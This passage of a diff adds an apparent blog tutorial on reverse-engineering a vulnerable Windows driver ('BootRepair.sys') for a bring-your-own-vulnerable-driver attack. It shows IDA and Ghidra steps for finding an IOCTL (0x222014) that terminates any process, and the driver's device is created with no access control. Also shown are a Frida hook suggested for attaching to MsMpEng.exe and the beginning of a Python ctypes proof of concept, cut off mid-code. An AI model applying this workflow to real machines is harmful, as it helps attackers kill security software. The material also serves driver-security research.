+  <text x="55" y="270" font-size="10" fill="#61afef">  call    </text><text x="120" y="270" font-size="10" fill="#e74c3c">ZwTerminateProcess      </text><text x="335" y="270" font-size="10" fill="#5c8c5c"> ; No PPL check!</text>
+  <text x="55" y="281" font-size="9" fill="#3a3a6a">; Press [X] on sub_14000198C → caller is IRP_MJ_DEVICE_CONTROL handler</text>
+
+  <!-- Step 3: IRP dispatch / IOCTL switch -->
+  <rect x="46" y="298" width="564" height="115" fill="#141525" rx="3" stroke="#3a3a5c" stroke-width="1"></rect>
+  <text x="55" y="314" font-size="9" fill="#6060a0">; ── IRP_MJ_DEVICE_CONTROL handler — MajorFunction[14] ─────────────────────</text>
+  <text x="55" y="330" font-size="10" fill="#c678dd">IrpDispatch  proc near</text>
+  <text x="55" y="346" font-size="10" fill="#61afef">  mov     </text><text x="120" y="346" font-size="10" fill="#e06c75">eax, [rdi+70h]      </text><text x="295" y="346" font-size="10" fill="#5c8c5c">; Parameters.DeviceIoControl.IoControlCode</text>
+  <text x="55" y="361" font-size="10" fill="#61afef">  cmp     </text><text x="120" y="361" font-size="10" fill="#f1c40f">eax, 222014h        </text><text x="295" y="361" font-size="10" fill="#e74c3c">; ← IOCTL CODE HERE ✓</text>
+  <text x="55" y="376" font-size="10" fill="#61afef">  jnz     </text><text x="120" y="376" font-size="10" fill="#808080">loc_unsupported</text>
+  <text x="55" y="391" font-size="10" fill="#61afef">  mov     </text><text x="120" y="391" font-size="10" fill="#e06c75">rcx, [rdi+20h]      </text><text x="295" y="391" font-size="10" fill="#5c8c5c">; AssociatedIrp.SystemBuffer → PID ptr</text>
+  <text x="55" y="405" font-size="9" fill="#3a3a6a">; Input: [rdi+38h] = InputBufferLength (must be ≥ 4)  No access check before call.</text>
+
+  <!-- Step 4: DriverEntry device path -->
+  <rect x="46" y="418" width="564" height="107" fill="#141525" rx="3" stroke="#3a3a5c" stroke-width="1"></rect>
+  <text x="55" y="434" font-size="9" fill="#6060a0">; ── DriverEntry — device name &amp; symbolic link ─────────────────────────────</text>
+  <text x="55" y="450" font-size="10" fill="#c678dd">DriverEntry  proc near</text>
+  <text x="55" y="466" font-size="10" fill="#61afef">  lea     </text><text x="120" y="466" font-size="10" fill="#98c379">rcx, aDeviceBootrep  </text><text x="310" y="466" font-size="10" fill="#5c8c5c">; L"\Device\BootRepair"</text>
+  <text x="55" y="481" font-size="10" fill="#61afef">  call    </text><text x="120" y="481" font-size="10" fill="#808080">IoCreateDevice        </text><text x="295" y="481" font-size="10" fill="#5c8c5c">; NULL SecurityDescriptor → no DACL</text>
+  <text x="55" y="496" font-size="10" fill="#61afef">  lea     </text><text x="120" y="496" font-size="10" fill="#98c379">rcx, aDosdevicesBoot </text><text x="310" y="496" font-size="10" fill="#5c8c5c">; L"\DosDevices\BootRepair"</text>
+  <text x="55" y="511" font-size="10" fill="#61afef">  call    </text><text x="120" y="511" font-size="10" fill="#808080">IoCreateSymbolicLink  </text><text x="295" y="511" font-size="10" fill="#27ae60">; Win32: \\.\BootRepair ✓</text>
+  <text x="55" y="524" font-size="9" fill="#3a3a6a">; [X] on DriverEntry → confirms SecurityDescriptor = NULL in IoCreateDevice call</text>
+
+  <!-- Right panel — legend / notes -->
+  <rect x="625" y="70" width="268" height="462" fill="#141525"></rect>
+  <text x="635" y="92" font-size="11" fill="#e6edf3" font-weight="bold">IDA — RE Workflow</text>
+  <line x1="635" y1="96" x2="886" y2="96" stroke="#3a3a5c" stroke-width="1"></line>
+
+  <text x="635" y="115" font-size="9" fill="#e74c3c" font-weight="bold">① Imports pane</text>
+  <text x="635" y="130" font-size="9" fill="#909090">Open View → Open Subviews</text>
+  <text x="635" y="145" font-size="9" fill="#909090">→ Imports. Filter for:</text>
+  <text x="635" y="160" font-size="9" fill="#e06c75">ZwTerminateProcess</text>
+  <text x="635" y="175" font-size="9" fill="#e06c75">MmMapIoSpace</text>
+  <text x="635" y="190" font-size="9" fill="#e06c75">ZwWriteVirtualMemory</text>
+
+  <line x1="635" y1="202" x2="886" y2="202" stroke="#2a2a4a" stroke-width="1"></line>
+  <text x="635" y="220" font-size="9" fill="#e67e22" font-weight="bold">② Cross-reference [X]</text>
+  <text x="635" y="235" font-size="9" fill="#909090">Press X on import →</text>
+  <text x="635" y="250" font-size="9" fill="#909090">find the calling function.</text>
+  <text x="635" y="265" font-size="9" fill="#909090">Rename: F IDA shortcut.</text>
+  <text x="635" y="280" font-size="9" fill="#909090">Press X again on caller</text>
+  <text x="635" y="295" font-size="9" fill="#909090">to reach IRP handler.</text>
+
+  <line x1="635" y1="307" x2="886" y2="307" stroke="#2a2a4a" stroke-width="1"></line>
+  <text x="635" y="325" font-size="9" fill="#f1c40f" font-weight="bold">③ IOCTL dispatch</text>
+  <text x="635" y="340" font-size="9" fill="#909090">Look for cmp eax, 0x???</text>
+  <text x="635" y="355" font-size="9" fill="#909090">constants after loading</text>
+  <text x="635" y="370" font-size="9" fill="#909090">IoStackLocation. These</text>
+  <text x="635" y="385" font-size="9" fill="#f1c40f">are your IOCTL codes.</text>
+  <text x="635" y="400" font-size="9" fill="#909090">Check +38h offset for</text>
+  <text x="635" y="415" font-size="9" fill="#909090">InputBufferLength guard.</text>
+
+  <line x1="635" y1="427" x2="886" y2="427" stroke="#2a2a4a" stroke-width="1"></line>
+  <text x="635" y="445" font-size="9" fill="#27ae60" font-weight="bold">④ DriverEntry strings</text>
+  <text x="635" y="460" font-size="9" fill="#909090">View → Strings. Look for</text>
+  <text x="635" y="475" font-size="9" fill="#98c379">\Device\*</text>
+  <text x="635" y="490" font-size="9" fill="#98c379">\DosDevices\*</text>
+  <text x="635" y="505" font-size="9" fill="#909090">xref → IoCreateDevice:</text>
+  <text x="635" y="520" font-size="9" fill="#27ae60">NULL SD = no DACL ✓</text>
+</svg>
+</div>
+
+<p>The IDA cross-reference chain in five steps:</p>
+
+<p><strong>Step 1: Imports.</strong> <code class="language-plaintext highlighter-rouge">View → Open Subviews → Imports</code>. Filter for <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code> exports. Flag <code class="language-plaintext highlighter-rouge">ZwTerminateProcess</code>, <code class="language-plaintext highlighter-rouge">MmMapIoSpace</code>, <code class="language-plaintext highlighter-rouge">PsLookupProcessByProcessId</code>, <code class="language-plaintext highlighter-rouge">ObOpenObjectByPointer</code>.</p>
+
+<p><strong>Step 2: Press <code class="language-plaintext highlighter-rouge">X</code>.</strong> On the dangerous import, press <code class="language-plaintext highlighter-rouge">X</code> to list all call sites. The calling function (e.g. <code class="language-plaintext highlighter-rouge">sub_14000198C</code>) is your termination routine. Rename it <code class="language-plaintext highlighter-rouge">byovd_terminate_process</code> for clarity.</p>
+
+<p><strong>Step 3: Follow xrefs up.</strong> Press <code class="language-plaintext highlighter-rouge">X</code> on your renamed termination function. The caller is the <code class="language-plaintext highlighter-rouge">IRP_MJ_DEVICE_CONTROL</code> handler. Look for a <code class="language-plaintext highlighter-rouge">cmp eax, 0x???</code> constant: that is the IOCTL code. Inspect <code class="language-plaintext highlighter-rouge">[rdi+38h]</code> (InputBufferLength) for size checks and <code class="language-plaintext highlighter-rouge">[rdi+20h]</code> (SystemBuffer) for the input pointer.</p>
+
+<p><strong>Step 4: DriverEntry strings.</strong> <code class="language-plaintext highlighter-rouge">View → Open Subviews → Strings</code>. Filter for <code class="language-plaintext highlighter-rouge">\Device\</code> and <code class="language-plaintext highlighter-rouge">\DosDevices\</code>. Cross-reference these strings to <code class="language-plaintext highlighter-rouge">DriverEntry</code>, find the <code class="language-plaintext highlighter-rouge">IoCreateDevice</code> call. If the SecurityDescriptor argument is <code class="language-plaintext highlighter-rouge">NULL</code>, there is no DACL; any caller can open the device.</p>
+
+<p><strong>Step 5: Confirm device path.</strong> The DosDevices symlink maps directly to the Win32 <code class="language-plaintext highlighter-rouge">\\.\</code> path you pass to <code class="language-plaintext highlighter-rouge">CreateFile</code>.</p>
+
+<hr>
+
+<h3 id="reversing-ioctls-in-ghidra">Reversing IOCTLs in Ghidra</h3>
+
+<!-- ============================================================
+     DIAGRAM 3b — Ghidra IOCTL RE Workflow Mockup
+     ============================================================ -->
+<div style="margin:2rem 0;overflow-x:auto;">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 560" width="100%" style="max-width:900px;display:block;margin:0 auto;font-family:'Courier New',monospace;">
+  <rect width="900" height="560" fill="#2b2b2b" rx="10"></rect>
+  <!-- Ghidra title bar -->
+  <rect width="900" height="30" fill="#3c3f41" rx="10"></rect>
+  <rect x="0" y="16" width="900" height="14" fill="#3c3f41"></rect>
+  <circle cx="16" cy="15" r="6" fill="#ff5f57"></circle>
+  <circle cx="36" cy="15" r="6" fill="#ffbd2e"></circle>
+  <circle cx="56" cy="15" r="6" fill="#28c840"></circle>
+  <text x="450" y="20" font-size="11" fill="#bbbbbb" text-anchor="middle">Ghidra 11.3 — CodeBrowser: BootRepair.sys</text>
+
+  <!-- Ghidra menu bar -->
+  <rect x="0" y="30" width="900" height="22" fill="#3c3f41"></rect>
+  <text x="10" y="45" font-size="10" fill="#bbbbbb">File  Edit  Analysis  Graph  Navigation  Search  Select  Tools  Window  Help</text>
+
+  <!-- Left panel: Symbol Tree / Functions -->
+  <rect x="0" y="52" width="200" height="500" fill="#313335" stroke="#555" stroke-width="0.5"></rect>
+  <text x="10" y="68" font-size="10" fill="#a9b7c6" font-weight="bold">Symbol Tree</text>
+  <line x1="0" y1="72" x2="200" y2="72" stroke="#555" stroke-width="1"></line>
+  <text x="10" y="88" font-size="9" fill="#6a8759">▼ Functions</text>
+  <text x="20" y="103" font-size="9" fill="#bbbbbb">DriverEntry</text>
+  <text x="20" y="118" font-size="9" fill="#cc7832">IrpDeviceControl</text>
+  <text x="30" y="133" font-size="9" fill="#ffc66d">  terminate_proc</text>
+  <text x="20" y="148" font-size="9" fill="#bbbbbb">IrpCreate</text>
+  <text x="20" y="163" font-size="9" fill="#bbbbbb">IrpClose</text>
+  <line x1="0" y1="174" x2="200" y2="174" stroke="#555" stroke-width="0.5"></line>
+  <text x="10" y="190" font-size="10" fill="#a9b7c6" font-weight="bold">Defined Strings</text>
+  <line x1="0" y1="194" x2="200" y2="194" stroke="#555" stroke-width="0.5"></line>
+  <text x="10" y="210" font-size="9" fill="#6a8759">u"\Device\BootRepair"</text>
+  <text x="10" y="225" font-size="9" fill="#6a8759">u"\DosDevices\BootRep"</text>
+  <line x1="0" y1="236" x2="200" y2="236" stroke="#555" stroke-width="0.5"></line>
+  <text x="10" y="252" font-size="10" fill="#a9b7c6" font-weight="bold">Imports</text>
+  <line x1="0" y1="256" x2="200" y2="256" stroke="#555" stroke-width="0.5"></line>
+  <text x="10" y="272" font-size="9" fill="#cc7832">ZwTerminateProcess</text>
+  <text x="10" y="287" font-size="9" fill="#cc7832">PsLookupProc…</text>
+  <text x="10" y="302" font-size="9" fill="#cc7832">ObOpenObjectBy…</text>
+  <text x="10" y="317" font-size="9" fill="#bbbbbb">IoCreateDevice</text>
+  <text x="10" y="332" font-size="9" fill="#bbbbbb">IoCreateSymbolicLink</text>
+
+  <!-- Step indicators on far left -->
+  <rect x="0" y="52" width="10" height="500" fill="#2b2b2b"></rect>
+
+  <!-- Main Decompiler pane -->
+  <rect x="200" y="52" width="540" height="500" fill="#2b2b2b"></rect>
+  <!-- Sub-tabs -->
+  <rect x="200" y="52" width="140" height="20" fill="#4e5254" stroke="#666" stroke-width="0.5"></rect>
+  <text x="270" y="66" font-size="10" fill="#bbbbbb" text-anchor="middle">Decompiler</text>
+  <rect x="342" y="52" width="130" height="20" fill="#3c3f41"></rect>
+  <text x="407" y="66" font-size="10" fill="#888" text-anchor="middle">Disassembly</text>
+  <rect x="474" y="52" width="130" height="20" fill="#3c3f41"></rect>
+  <text x="539" y="66" font-size="10" fill="#888" text-anchor="middle">Bytes</text>
+
+  <!-- Decompiler output: IrpDeviceControl -->
+  <rect x="205" y="76" width="530" height="180" fill="#1e1e1e" rx="3" stroke="#555" stroke-width="0.5"></rect>
+  <text x="215" y="94" font-size="9" fill="#808080">/* IRP_MJ_DEVICE_CONTROL handler — auto-decompiled */</text>
+  <text x="215" y="109" font-size="10" fill="#cc7832">NTSTATUS  </text><text x="285" y="109" font-size="10" fill="#ffc66d">IrpDeviceControl</text><text x="390" y="109" font-size="10" fill="#a9b7c6">(PDEVICE_OBJECT dev, PIRP irp)</text>
+  <text x="215" y="124" font-size="10" fill="#a9b7c6">{</text>
+  <text x="225" y="139" font-size="10" fill="#a9b7c6">  PIO_STACK_LOCATION stack = </text><text x="415" y="139" font-size="10" fill="#cc7832">IoGetCurrentIrpStackLocation</text><text x="605" y="139" font-size="10" fill="#a9b7c6">(irp);</text>
+  <text x="225" y="154" font-size="10" fill="#cc7832">  ULONG </text><text x="280" y="154" font-size="10" fill="#a9b7c6">code = stack-&gt;Parameters.DeviceIoControl.</text><text x="530" y="154" font-size="10" fill="#9876aa">IoControlCode</text><text x="625" y="154" font-size="10" fill="#a9b7c6">;</text>
+  <text x="225" y="169" font-size="10" fill="#6897bb">  if </text><text x="250" y="169" font-size="10" fill="#a9b7c6">(code == </text><text x="315" y="169" font-size="10" fill="#6a8759">0x222014</text><text x="365" y="169" font-size="10" fill="#a9b7c6">) {                </text><text x="480" y="169" font-size="10" fill="#808080">/* ← IOCTL found */</text>
+  <text x="225" y="184" font-size="10" fill="#6897bb">    DWORD </text><text x="278" y="184" font-size="10" fill="#a9b7c6">pid = *(DWORD*)irp-&gt;AssociatedIrp.</text><text x="500" y="184" font-size="10" fill="#9876aa">SystemBuffer</text><text x="580" y="184" font-size="10" fill="#a9b7c6">;</text>
+  <text x="225" y="199" font-size="10" fill="#a9b7c6">    </text><text x="240" y="199" font-size="10" fill="#ffc66d">terminate_proc</text><text x="335" y="199" font-size="10" fill="#a9b7c6">(pid);             </text><text x="460" y="199" font-size="10" fill="#808080">/* no size check before call */</text>
+  <text x="225" y="214" font-size="10" fill="#a9b7c6">  }</text>
+  <text x="225" y="229" font-size="10" fill="#6897bb">  return </text><text x="280" y="229" font-size="10" fill="#9876aa">STATUS_SUCCESS</text><text x="375" y="229" font-size="10" fill="#a9b7c6">;</text>
+  <text x="215" y="244" font-size="10" fill="#a9b7c6">}</text>
+  <text x="215" y="252" font-size="9" fill="#555">/* Right-click 0x222014 → References → Find References → xref to callers */</text>
+
+  <!-- Decompiler: terminate_proc -->
+  <rect x="205" y="262" width="530" height="155" fill="#1e1e1e" rx="3" stroke="#555" stroke-width="0.5"></rect>
+  <text x="215" y="280" font-size="9" fill="#808080">/* terminate_proc — renamed from FUN_14000198c via right-click → Rename Function */</text>
+  <text x="215" y="295" font-size="10" fill="#cc7832">NTSTATUS  </text><text x="285" y="295" font-size="10" fill="#ffc66d">terminate_proc</text><text x="380" y="295" font-size="10" fill="#a9b7c6">(DWORD pid)</text>
+  <text x="215" y="310" font-size="10" fill="#a9b7c6">{</text>
+  <text x="225" y="325" font-size="10" fill="#cc7832">  PEPROCESS </text><text x="300" y="325" font-size="10" fill="#a9b7c6">*proc;</text>
+  <text x="225" y="340" font-size="10" fill="#cc7832">  HANDLE    </text><text x="300" y="340" font-size="10" fill="#a9b7c6">hProc;</text>
+  <text x="225" y="355" font-size="10" fill="#ffc66d">  PsLookupProcessByProcessId</text><text x="425" y="355" font-size="10" fill="#a9b7c6">((HANDLE)pid, &amp;proc);</text>
+  <text x="225" y="370" font-size="10" fill="#ffc66d">  ObOpenObjectByPointer</text><text x="375" y="370" font-size="10" fill="#a9b7c6">(proc, 0, NULL, 0x1FFFFF, *PsProcessType, 0, &amp;hProc);</text>
+  <text x="225" y="385" font-size="10" fill="#cc7832">  </text><text x="228" y="385" font-size="10" fill="#ffc66d">ZwTerminateProcess</text><text x="360" y="385" font-size="10" fill="#a9b7c6">(hProc, 0);   </text><text x="480" y="385" font-size="10" fill="#808080">/* PPL irrelevant at Ring 0 */</text>
+  <text x="215" y="408" font-size="10" fill="#a9b7c6">}</text>
+
+  <!-- Decompiler: DriverEntry snippet -->
+  <rect x="205" y="423" width="530" height="122" fill="#1e1e1e" rx="3" stroke="#555" stroke-width="0.5"></rect>
+  <text x="215" y="441" font-size="9" fill="#808080">/* DriverEntry — device creation and symlink */</text>
+  <text x="215" y="456" font-size="10" fill="#cc7832">NTSTATUS  </text><text x="285" y="456" font-size="10" fill="#ffc66d">DriverEntry</text><text x="350" y="456" font-size="10" fill="#a9b7c6">(PDRIVER_OBJECT drv, PUNICODE_STRING reg)</text>
+  <text x="215" y="471" font-size="10" fill="#a9b7c6">{</text>
+  <text x="225" y="486" font-size="10" fill="#ffc66d">  IoCreateDevice</text><text x="330" y="486" font-size="10" fill="#a9b7c6">(drv, 0, &amp;devName, FILE_DEVICE_UNKNOWN, 0, FALSE,</text>
+  <text x="225" y="501" font-size="10" fill="#cc7832">    NULL</text><text x="258" y="501" font-size="10" fill="#a9b7c6">, &amp;devObj);   </text><text x="370" y="501" font-size="10" fill="#cc7832">/* NULL SecurityDesc → no DACL 🚨 */</text>
+  <text x="225" y="516" font-size="10" fill="#ffc66d">  IoCreateSymbolicLink</text><text x="375" y="516" font-size="10" fill="#a9b7c6">(&amp;symLink, &amp;devName); </text><text x="530" y="516" font-size="10" fill="#808080">/* \DosDevices\BootRepair */</text>
+  <text x="215" y="531" font-size="10" fill="#6897bb">  return </text><text x="265" y="531" font-size="10" fill="#9876aa">STATUS_SUCCESS</text><text x="358" y="531" font-size="10" fill="#a9b7c6">;</text>
+  <text x="215" y="546" font-size="10" fill="#a9b7c6">}</text>
+
+  <!-- Right panel: Ghidra notes -->
+  <rect x="740" y="52" width="160" height="500" fill="#313335" stroke="#555" stroke-width="0.5"></rect>
+  <text x="750" y="70" font-size="10" fill="#a9b7c6" font-weight="bold">Ghidra Workflow</text>
+  <line x1="740" y1="74" x2="900" y2="74" stroke="#555" stroke-width="1"></line>
+
+  <text x="750" y="93" font-size="9" fill="#cc7832" font-weight="bold">① Symbol Tree</text>
+  <text x="750" y="108" font-size="9" fill="#888">Expand Imports →</text>
+  <text x="750" y="123" font-size="9" fill="#888">right-click import</text>
+  <text x="750" y="138" font-size="9" fill="#888">→ References →</text>
+  <text x="750" y="153" font-size="9" fill="#cc7832">Show References</text>
+
+  <line x1="750" y1="163" x2="895" y2="163" stroke="#444" stroke-width="0.5"></line>
+  <text x="750" y="180" font-size="9" fill="#ffc66d" font-weight="bold">② Rename (L)</text>
+  <text x="750" y="195" font-size="9" fill="#888">Press L on function</text>
+  <text x="750" y="210" font-size="9" fill="#888">to rename. Use</text>
+  <text x="750" y="225" font-size="9" fill="#888">Ctrl+L for vars.</text>
+
+  <line x1="750" y1="235" x2="895" y2="235" stroke="#444" stroke-width="0.5"></line>
+  <text x="750" y="252" font-size="9" fill="#6a8759" font-weight="bold">③ IOCTL constant</text>
+  <text x="750" y="267" font-size="9" fill="#888">Search → For</text>
+  <text x="750" y="282" font-size="9" fill="#888">Scalars. Enter</text>
+  <text x="750" y="297" font-size="9" fill="#6a8759">0x222014</text>
+  <text x="750" y="312" font-size="9" fill="#888">or use script:</text>
+  <text x="750" y="327" font-size="9" fill="#6a8759">find_ioctls.py</text>
+
+  <line x1="750" y1="337" x2="895" y2="337" stroke="#444" stroke-width="0.5"></line>
+  <text x="750" y="354" font-size="9" fill="#9876aa" font-weight="bold">④ Decompiler</text>
+  <text x="750" y="369" font-size="9" fill="#888">Window →</text>
+  <text x="750" y="384" font-size="9" fill="#888">Decompiler. Shows</text>
+  <text x="750" y="399" font-size="9" fill="#888">C pseudo-code.</text>
+  <text x="750" y="414" font-size="9" fill="#9876aa">NULL in 5th arg</text>
+  <text x="750" y="429" font-size="9" fill="#888">to IoCreateDevice</text>
+  <text x="750" y="444" font-size="9" fill="#888">= no DACL.</text>
+
+  <line x1="750" y1="454" x2="895" y2="454" stroke="#444" stroke-width="0.5"></line>
+  <text x="750" y="471" font-size="9" fill="#808080" font-weight="bold">Script tip</text>
+  <text x="750" y="486" font-size="9" fill="#888">Analysis → Run</text>
+  <text x="750" y="501" font-size="9" fill="#888">Script → import</text>
+  <text x="750" y="516" font-size="9" fill="#6a8759">DrvEye --ghidra</text>
+  <text x="750" y="531" font-size="9" fill="#888">for auto-labels</text>
+  <text x="750" y="546" font-size="9" fill="#888">&amp; IOCTL decode</text>
+</svg>
+</div>
+
+<p>Ghidra’s free, open-source nature makes it the go-to for driver RE in resource-constrained environments. The workflow mirrors IDA’s but with different mechanics:</p>
+
+<p><strong>Step 1: Symbol Tree → Imports.</strong> Expand <code class="language-plaintext highlighter-rouge">Imports</code> in the Symbol Tree panel. Right-click <code class="language-plaintext highlighter-rouge">ZwTerminateProcess</code> → <code class="language-plaintext highlighter-rouge">References → Show References to ZwTerminateProcess</code>. The reference panel lists every call site.</p>
+
+<p><strong>Step 2: Decompiler + Rename.</strong> Double-click a reference to jump to the caller. The Decompiler pane (Window → Decompiler) renders C pseudo-code automatically, far faster to read than raw disassembly. Press <code class="language-plaintext highlighter-rouge">L</code> to rename the function (e.g. <code class="language-plaintext highlighter-rouge">terminate_proc</code>). Press <code class="language-plaintext highlighter-rouge">Ctrl+L</code> to rename local variables.</p>
+
+<p><strong>Step 3: Find the IOCTL constant.</strong> <code class="language-plaintext highlighter-rouge">Search → For Scalars</code>. Enter <code class="language-plaintext highlighter-rouge">0x222014</code>. Ghidra highlights all occurrences across the entire binary. Alternatively, use Ghidra’s <code class="language-plaintext highlighter-rouge">find_ioctls.py</code> community script (from the Ghidra Script Manager) which automatically walks dispatch tables and emits a decoded IOCTL list.</p>
+
+<p><strong>Step 4: DriverEntry NULL SecurityDescriptor.</strong> Follow the string <code class="language-plaintext highlighter-rouge">\Device\BootRepair</code> (Defined Strings panel) to its xref in <code class="language-plaintext highlighter-rouge">DriverEntry</code>. The Decompiler renders the <code class="language-plaintext highlighter-rouge">IoCreateDevice</code> call clearly. The fifth argument (SecurityDescriptor) being <code class="language-plaintext highlighter-rouge">NULL</code> is immediately visible in the pseudo-code; no assembly reading required.</p>
+
+<p><strong>Key Ghidra advantage over IDA for this workflow:</strong> the decompiler produces readable C that makes the <code class="language-plaintext highlighter-rouge">NULL SecurityDescriptor</code> and missing <code class="language-plaintext highlighter-rouge">InputBufferLength</code> guard checks visible at a glance, without needing to trace register values through multiple basic blocks.</p>
+
+<h3 id="device-path-recovery">Device Path Recovery</h3>
+
+<p>For hardened drivers that construct device names at runtime (string concatenation, XOR decoding, format strings), static analysis fails in both tools. DrvEye handles this via a Unicorn-emulated <code class="language-plaintext highlighter-rouge">DriverEntry</code> sandbox that executes the initialisation code and captures the resulting device name, without loading unsigned code on a real system.</p>
+
+<h3 id="dynamic-analysis-intercepting-ioctls-with-frida">Dynamic Analysis: Intercepting IOCTLs with Frida</h3>
+
+<p>When a driver computes IOCTL codes at runtime, or when static analysis reveals multiple candidate constants and you need to confirm which one fires under real conditions, dynamic interception is faster than a debugger. The Frida hook below attaches to any user-mode process and logs every <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> call with its code and input buffer before the IRP crosses the Ring 3 boundary.</p>
+
+<div class="ghidra-mock" style="overflow-x:auto;">
+  <div class="gm-bar">
+    <span style="color:#ff5f56">●</span>&nbsp;<span style="color:#ffbd2e">●</span>&nbsp;<span style="color:#27c93f">●</span>
+    <span style="margin-left:12px;color:#8b949e;font-size:11px;font-family:'Courier New',monospace;">frida_ioctl_hook.js — Frida 16.x</span>
+  </div>
+  <div style="padding:16px 22px 18px;font-family:'Courier New',monospace;font-size:12.5px;line-height:1.9;">
+    <div><span style="color:#484f58;">// Hook DeviceIoControl — log every IOCTL code and input buffer</span></div>
+    <div><span style="color:#60a5fa;">const </span><span style="color:#a78bfa;">DeviceIoControl</span><span style="color:#8b949e;"> = </span><span style="color:#fbbf24;">Module.findExportByName</span><span style="color:#8b949e;">(</span><span style="color:#17fe33;">"kernel32.dll"</span><span style="color:#8b949e;">, </span><span style="color:#17fe33;">"DeviceIoControl"</span><span style="color:#8b949e;">);</span></div>
+    <div style="margin-top:4px;"><span style="color:#a78bfa;">Interceptor</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">attach</span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">DeviceIoControl</span><span style="color:#8b949e;">, {</span></div>
+    <div style="margin-left:20px;"><span style="color:#fbbf24;">onEnter</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">args</span><span style="color:#8b949e;">) {</span></div>
+    <div style="margin-left:40px;"><span style="color:#60a5fa;">const </span><span style="color:#a78bfa;">code</span><span style="color:#8b949e;">   = </span><span style="color:#f97316;">args</span><span style="color:#8b949e;">[1].</span><span style="color:#fbbf24;">toInt32</span><span style="color:#8b949e;">();</span></div>
+    <div style="margin-left:40px;"><span style="color:#60a5fa;">const </span><span style="color:#a78bfa;">inSize</span><span style="color:#8b949e;"> = </span><span style="color:#f97316;">args</span><span style="color:#8b949e;">[3].</span><span style="color:#fbbf24;">toInt32</span><span style="color:#8b949e;">();</span></div>
+    <div style="margin-left:40px;"><span style="color:#60a5fa;">const </span><span style="color:#a78bfa;">inBuf</span><span style="color:#8b949e;">  = </span><span style="color:#f97316;">args</span><span style="color:#8b949e;">[2];</span></div>
+    <div style="margin-left:40px;margin-top:4px;"><span style="color:#17fe33;">console</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">log</span><span style="color:#8b949e;">(</span></div>
+    <div style="margin-left:60px;"><span style="color:#17fe33;">"[IOCTL]"</span><span style="color:#8b949e;">,</span></div>
+    <div style="margin-left:60px;"><span style="color:#17fe33;">"code=0x"</span><span style="color:#8b949e;"> + </span><span style="color:#a78bfa;">code</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">toString</span><span style="color:#8b949e;">(16).</span><span style="color:#fbbf24;">padStart</span><span style="color:#8b949e;">(8, </span><span style="color:#17fe33;">"0"</span><span style="color:#8b949e;">),</span></div>
+    <div style="margin-left:60px;"><span style="color:#17fe33;">"inSize="</span><span style="color:#8b949e;"> + </span><span style="color:#a78bfa;">inSize</span></div>
+    <div style="margin-left:40px;"><span style="color:#8b949e;">);</span></div>
+    <div style="margin-left:40px;margin-top:4px;"><span style="color:#60a5fa;">if </span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">inSize</span><span style="color:#8b949e;"> === </span><span style="color:#f97316;">4</span><span style="color:#8b949e;">)</span></div>
+    <div style="margin-left:60px;"><span style="color:#17fe33;">console</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">log</span><span style="color:#8b949e;">(</span><span style="color:#17fe33;">"  pid ="</span><span style="color:#8b949e;">, </span><span style="color:#a78bfa;">inBuf</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">readU32</span><span style="color:#8b949e;">());</span></div>
+    <div style="margin-left:20px;"><span style="color:#8b949e;">}</span></div>
+    <div><span style="color:#8b949e;">});</span></div>
+    <div style="margin-top:10px;padding-top:10px;border-top:1px solid #21262d;">
+      <span style="color:#484f58;">// frida -p &lt;PID&gt; -l frida_ioctl_hook.js</span>
+    </div>
+    <div><span style="color:#484f58;">// frida -n MsMpEng.exe -l frida_ioctl_hook.js  ← hook AV vendor binary directly</span></div>
+  </div>
+</div>
+
+<p>Attach to <code class="language-plaintext highlighter-rouge">MsMpEng.exe</code> or any other vendor binary to observe every IOCTL its user-mode component sends to its own driver. The <code class="language-plaintext highlighter-rouge">inSize === 4</code> branch auto-decodes the PID from a <code class="language-plaintext highlighter-rouge">METHOD_BUFFERED</code> 4-byte input, confirming both the control code and the exact input format without touching the driver binary.</p>
+
+<h3 id="sending-ioctls-from-python">Sending IOCTLs from Python</h3>
+
+<p>Once the device path, IOCTL code, and input buffer layout are confirmed, <code class="language-plaintext highlighter-rouge">ctypes</code> provides everything needed to build a working PoC without compiling a C project. Two primitives are sufficient: <code class="language-plaintext highlighter-rouge">CreateFileW</code> to obtain a device handle, and <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> to dispatch the IRP.</p>
+
+<div class="ghidra-mock" style="overflow-x:auto;">
+  <div class="gm-bar">
+    <span style="color:#ff5f56">●</span>&nbsp;<span style="color:#ffbd2e">●</span>&nbsp;<span style="color:#27c93f">●</span>
+    <span style="margin-left:12px;color:#8b949e;font-size:11px;font-family:'Courier New',monospace;">byovd_sender.py — Python 3.x · requires Administrator</span>
+  </div>
+  <div style="padding:16px 22px 18px;font-family:'Courier New',monospace;font-size:12.5px;line-height:1.9;">
+    <div><span style="color:#60a5fa;">import </span><span style="color:#8b949e;">ctypes, ctypes.wintypes </span><span style="color:#60a5fa;">as </span><span style="color:#a78bfa;">wt</span><span style="color:#8b949e;">, struct</span></div>
+    <div style="margin-top:6px;"><span style="color:#a78bfa;">kernel32</span><span style="color:#8b949e;"> = </span><span style="color:#a78bfa;">ctypes</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">windll</span><span style="color:#8b949e;">.kernel32</span></div>
+    <div style="margin-top:8px;"><span style="color:#a78bfa;">GENERIC_RW</span><span style="color:#8b949e;">     = </span><span style="color:#f97316;">0x80000000</span><span style="color:#8b949e;"> | </span><span style="color:#f97316;">0x40000000</span></div>
+    <div><span style="color:#a78bfa;">FILE_SHARE_RW</span><span style="color:#8b949e;">  = </span><span style="color:#f97316;">0x1</span><span style="color:#8b949e;"> | </span><span style="color:#f97316;">0x2</span></div>
+    <div><span style="color:#a78bfa;">OPEN_EXISTING</span><span style="color:#8b949e;">  = </span><span style="color:#f97316;">3</span></div>
+    <div><span style="color:#a78bfa;">INVALID_HANDLE</span><span style="color:#8b949e;"> = </span><span style="color:#a78bfa;">wt</span><span style="color:#8b949e;">.</span><span style="color:#a78bfa;">HANDLE</span><span style="color:#8b949e;">(-1).value</span></div>
